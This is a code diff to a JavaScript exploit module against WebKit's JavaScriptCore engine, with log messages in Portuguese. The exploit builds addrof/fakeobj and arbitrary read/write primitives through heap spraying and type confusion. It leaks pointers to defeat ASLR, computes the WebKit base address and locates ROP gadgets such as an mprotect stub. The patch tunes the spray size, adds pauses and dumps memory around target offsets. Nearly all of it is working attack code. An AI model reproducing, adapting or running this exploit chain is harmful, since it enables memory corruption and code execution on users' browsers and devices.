@@ -23,9 +23,10 @@ import {
     triggerOOB_primitive,
     getOOBDataView,
     clearOOBEnvironment,
+    oob_read_absolute // Import oob_read_absolute for inspecting memory
 } from '../core_exploit.mjs';
 
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { WEBKIT_LIBRARY_INFO } from '../config.mjs'; // JSC_OFFSETS will be passed as argument
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R60_REAL_ASLR_LEAK_JSFUNCTION_EVAL_ZERO";
 
@@ -51,8 +52,8 @@ function doubleToInt64(double, logFn) { // Added logFn
 
 let global_spray_objects = [];
 
-// Modified to accept logFn and pauseFn
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn) {
+// Modified to accept logFn, pauseFn, and JSC_OFFSETS
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - JSFunction Avaliando 0x0) ---`, "test");
 
@@ -71,19 +72,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
         const sprayStartTime = performance.now();
-        logFn("Iniciando spray de objetos (volume aumentado) para estabilização inicial do heap e anti-GC...", "info");
-        for (let i = 0; i < 10000; i++) {
+        // Option 1: Increased Spray Volume
+        const SPRAY_COUNT = 50000; // Increased from 10000 to 50000
+        logFn(`Iniciando spray de objetos (volume aumentado para ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
+        for (let i = 0; i < SPRAY_COUNT; i++) {
             global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(50).fill(i % 255) });
         }
         logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
         logFn("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
+        await pauseFn(100); // Option 2: Strategic pause after spray
 
         // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj ---
         logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
         const oobSetupStartTime = performance.now();
         logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
-        // core_exploit.mjs already uses 'log' which will be locally defined in run_isolated_test.mjs
-        // so we don't need to pass logFn here, but if core_exploit.mjs needed its own log, we would pass it.
         await triggerOOB_primitive({ force_reinit: true });
 
         if (!getOOBDataView()) {
@@ -105,8 +107,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             victim_array_main[0] = obj;
             const addr = doubleToInt64(confused_array_main[0], logFn); // Pass logFn
             if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
-                const failMsg = `[addrof] FALHA: Endereço retornado para ${obj} (${addr.toString(true)}) parece inválido ou nulo/NaN.`;
-                logFn(failMsg, "error");
+                // Option 4: Detailed Address Logging
+                logFn(`[addrof] FALHA DETALHADA: Endereço retornado para ${obj} (${addr ? addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN. low: 0x${addr?.low().toString(16) || 'N/A'}, high: 0x${addr?.high().toString(16) || 'N/A'}.`, "error");
+                const failMsg = `[addrof] FALHA: Endereço retornado para ${obj} (${addr ? addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN.`;
                 throw new Error(failMsg);
             }
             logFn(`[addrof] SUCESSO: Endereço retornado para objeto ${obj}: ${addr.toString(true)}`, "debug");
@@ -123,7 +126,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             confused_array_main[0] = int64ToDouble(addr, logFn); // Pass logFn
             const obj = victim_array_main[0];
             if (obj === undefined || obj === null) {
-                logFn(`[fakeobj] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser um objeto inválido.`, "warn");
+                logFn(`[fakeobj] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn");
             } else {
                 logFn(`[fakeobj] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj}`, "debug");
             }
@@ -141,8 +144,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const leaker_addr = addrof_primitive(leaker);
         logFn(`Endereço de 'leaker' obtido: ${leaker_addr.toString(true)}`, "info");
 
-        const val_prop_addr = leaker_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-        logFn(`Endereço da propriedade 'val_prop' calculada: ${val_prop_addr.toString(true)} (offset 0x${JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET.toString(16)} do leaker_addr)`, "info");
+        // Ensure the original ArrayBuffer of the OOB DataView is not garbage collected
+        // This is a defensive measure to keep the underlying ArrayBuffer alive during critical operations.
+        const original_oob_array_buffer = getOOBDataView().buffer;
+        logFn(`Referência ao ArrayBuffer original do OOB DataView (${original_oob_array_buffer.byteLength} bytes) mantida para evitar GC inesperado.`, "info");
+
+        const val_prop_addr = leaker_addr.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
+        logFn(`Endereço da propriedade 'val_prop' calculada: ${val_prop_addr.toString(true)} (offset 0x${JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET.toString(16)} do leaker_addr)`, "info");
 
         arb_read_primitive = (addr) => {
             logFn(`[ARB_READ] Tentando ler de endereço ${addr.toString(true)}`, "debug");
@@ -196,6 +204,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // Este passo fará com que o JSFunction seja alocado no "slot quente" de colisão.
         const js_function_addr = addrof_primitive(leak_candidate_js_function);
         logFn(`[REAL LEAK] Endereço do JSFunction: ${js_function_addr.toString(true)}`, "leak");
+        await pauseFn(SHORT_PAUSE); // Option 2: Strategic pause
 
         // *************** VERIFICAÇÃO CRÍTICA DE COLISÃO DO ENDEREÇO DE VAZAMENTO ***************
         // Obter o endereço base do confused_array_main para confirmação da sobreposição
@@ -210,35 +219,61 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
              logFn(`[REAL LEAK] ALERTA CRÍTICO: JSFunction de vazamento e confused_array_main NÃO colidiram. Esta estratégia de vazamento pode não ser adequada.`, "error");
              throw new Error("[REAL LEAK] Estratégia de vazamento por sobreposição falhou: Endereços não se sobrepõem.");
         }
+        await pauseFn(SHORT_PAUSE); // Option 2: Strategic pause
         // *************************************************************************************
 
         // 3. Ler o ponteiro para o Executable* do JSFunction
         // O Executable é o que contém o código da função.
-        const executable_ptr = arb_read_primitive(js_function_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET));
+        const executable_ptr_offset = JSC_OFFSETS_PARAM.JSFunction.EXECUTABLE_OFFSET;
+        logFn(`[REAL LEAK] Tentando ler Executable* no offset 0x${executable_ptr_offset.toString(16)} do JSFunction...`, "info");
+
+        // Option 3: Read surrounding offsets for debugging
+        const READ_RADIUS = 0x20; // Read 32 bytes before and after the target offset
+        logFn(`[REAL LEAK] DEBUG: Lendo ${READ_RADIUS * 2} bytes ao redor do offset do Executable* (${toHex(executable_ptr_offset)}) para inspeção...`, "debug");
+        for (let i = -READ_RADIUS; i <= READ_RADIUS; i += 8) {
+            const current_debug_offset = js_function_addr.add(executable_ptr_offset + i);
+            try {
+                const debug_value = arb_read_primitive(current_debug_offset);
+                logFn(`[REAL LEAK] DEBUG_MEM: Offset 0x${(executable_ptr_offset + i).toString(16).padStart(2, '0')}: ${debug_value.toString(true)}`, "debug");
+            } catch (e) {
+                logFn(`[REAL LEAK] DEBUG_MEM: Offset 0x${(executable_ptr_offset + i).toString(16).padStart(2, '0')}: Erro ao ler (${e.message})`, "warn");
+            }
+        }
+        await pauseFn(SHORT_PAUSE); // Option 2: Strategic pause
+
+        const executable_ptr = arb_read_primitive(js_function_addr.add(executable_ptr_offset));
         if (!isAdvancedInt64Object(executable_ptr) || executable_ptr.equals(AdvancedInt64.Zero) || executable_ptr.equals(AdvancedInt64.NaNValue)) {
-            throw new Error(`[REAL LEAK] Falha ao ler ponteiro do Executable do JSFunction. Endereço inválido: ${executable_ptr.toString(true)}. Isso pode indicar corrupção no slot ou offset incorreto.`);
+            // Option 4: Detailed Address Logging for failure
+            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro do Executable do JSFunction. Endereço inválido: ${executable_ptr ? executable_ptr.toString(true) : 'N/A'}. low: 0x${executable_ptr?.low().toString(16) || 'N/A'}, high: 0x${executable_ptr?.high().toString(16) || 'N/A'}. Isso pode indicar corrupção no slot ou offset incorreto.`;
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
         }
         logFn(`[REAL LEAK] Ponteiro para o Executable* do JSFunction: ${executable_ptr.toString(true)}`, "leak");
+        await pauseFn(SHORT_PAUSE); // Option 2: Strategic pause
 
         // 4. Ler o ponteiro para a Structure* do Executable
         // O Executable também é um JSCell, então seu Structure* está em JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET (0x8)
-        const executable_structure_ptr = arb_read_primitive(executable_ptr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        const executable_structure_ptr = arb_read_primitive(executable_ptr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET));
         if (!isAdvancedInt64Object(executable_structure_ptr) || executable_structure_ptr.equals(AdvancedInt64.Zero) || executable_structure_ptr.equals(AdvancedInt64.NaNValue)) {
-            throw new Error(`[REAL LEAK] Falha ao ler ponteiro da Structure do Executable. Endereço inválido: ${executable_structure_ptr.toString(true)}. Isso pode indicar corrupção no slot ou offset incorreto.`);
+            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Executable. Endereço inválido: ${executable_structure_ptr ? executable_structure_ptr.toString(true) : 'N/A'}. low: 0x${executable_structure_ptr?.low().toString(16) || 'N/A'}, high: 0x${executable_structure_ptr?.high().toString(16) || 'N/A'}. Isso pode indicar corrupção no slot ou offset incorreto.`;
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
         }
         logFn(`[REAL LEAK] Ponteiro para a Structure* do Executable: ${executable_structure_ptr.toString(true)}`, "leak");
+        await pauseFn(SHORT_PAUSE); // Option 2: Strategic pause
 
         // 5. Ler o ponteiro para a ClassInfo* da Structure do Executable
         // Offset: JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
-        const class_info_ptr = arb_read_primitive(executable_structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        const class_info_ptr = arb_read_primitive(executable_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET));
         if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
-            throw new Error(`[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Executable. Endereço inválido: ${class_info_ptr.toString(true)}. Isso pode indicar corrupção no slot ou offset incorreto.`);
+            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Executable. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}. low: 0x${class_info_ptr?.low().toString(16) || 'N/A'}, high: 0x${class_info_ptr?.high().toString(16) || 'N/A'}. Isso pode indicar corrupção no slot ou offset incorreto.`;
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
         }
         logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::Executable::s_info): ${class_info_ptr.toString(true)}`, "leak");
+        await pauseFn(SHORT_PAUSE); // Option 2: Strategic pause
 
         // 6. Calcular o endereço base do WebKit
-        // Assumimos que JSC::Executable::s_info tem o mesmo offset da base que JSC::JSArrayBufferView::s_info.
-        // Isso é uma ASSUNÇÃO CRÍTICA e precisa ser validada por engenharia reversa.
         const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
         webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FROM_BASE);
 
@@ -251,6 +286,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         } else {
             logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO via vazamento de s_info do Executable.", "good");
         }
+        await pauseFn(MEDIUM_PAUSE); // Option 2: Strategic pause
 
         // Descoberta de Gadgets (Funcional)
         logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
@@ -260,6 +296,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
         logFn(`FUNCIONAL: Verificação da viabilidade de construir uma cadeia ROP/JOP... (requer mais lógica de exploit)`, "info");
         logFn(`PREPARADO: Ferramentas para ROP/JOP (endereços reais) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
+        await pauseFn(MEDIUM_PAUSE); // Option 2: Strategic pause
 
         // --- FASE 5: Verificação Funcional de L/E e Teste de Resistência (Pós-Vazamento de ASLR) ---
         logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
@@ -272,7 +309,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
         const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
-        const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
+        const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
 
         logFn(`Executando arb_write_primitive (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
         arb_write_primitive(prop_a_addr_post_leak, value_to_write_post_leak);
